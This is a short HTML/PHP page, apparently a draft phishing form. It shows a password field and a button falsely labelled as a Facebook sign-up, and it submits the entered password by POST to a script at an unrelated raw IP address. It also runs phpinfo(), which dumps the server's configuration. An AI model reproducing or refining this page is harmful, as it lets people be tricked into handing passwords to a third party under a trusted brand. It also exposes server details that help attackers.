<html>
<head>
	<meta charset="utf-8"/>
	<title></title>
</head>
<body>
<form action="http://25.193.95.195/test.php" method="POST">
	<label for="password">
		<input name="password" id="password" type="password" placeholder="Mot de passe désiré"/>
	</label>
	<input type="submit" value="S'inscrire avec Facebook" />
</form>
<?php
curl_init();
phpinfo();
?>
</body>
</html>